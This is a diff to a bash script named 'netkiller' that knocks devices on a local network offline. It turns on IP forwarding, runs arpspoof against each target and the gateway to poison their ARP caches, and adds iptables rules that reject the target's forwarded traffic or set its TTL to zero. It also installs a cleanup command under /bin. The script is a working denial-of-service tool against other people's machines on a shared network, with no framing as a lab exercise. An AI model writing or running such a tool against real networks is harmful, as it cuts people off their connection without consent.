@@ -20,6 +20,12 @@ if [ "$(id -u)" -ne 0 ]; then
     exit 1
 fi
 
+# IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
+iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
+echo " "
+
 # Functions for clean up
 cat > /bin/netkiller-stop << EOF
 #!/bin/bash
@@ -27,18 +33,15 @@ cat > /bin/netkiller-stop << EOF
 echo -e "\nCleaning up rules..."
 sleep 2
 echo -e "\nUnblocking network devices..."
-pkill -f arpspoof && pkill arpspoof 
+pkill -f arpspoof
+pkill arpspoof
 ip -s -s neigh flush all >/dev/null 2>&1
-iptables -t mangle -F PREROUTING
+iptables -t mangle -F
+iptables -F FORWARD
 sleep 2
 echo -e "\nConnection is restored..."
 EOF
-chmod 755 /bin/netkiller-stop 
-
-# IP forwarding
-echo 1 > /proc/sys/net/ipv4/ip_forward
-echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
-echo " "
+chmod 755 /bin/netkiller-stop
 
 # Detect interface
 WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
@@ -227,10 +230,13 @@ echo " "
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
-     iptables -t mangle -I PREROUTING -s "$TARGET" -j TTL --ttl-set 0
-     iptables -t mangle -I PREROUTING -d "$TARGET" -j TTL --ttl-set 0
+     iptables -A FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
+     iptables -A FORWARD -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
+     iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
     PIDS+=($!)
 done
 
-echo -e "\nTo stop Netkiller, run: netkiller-stop"
+echo "To stop Netkiller, run: netkiller-stop"
+echo " "
+arp -e
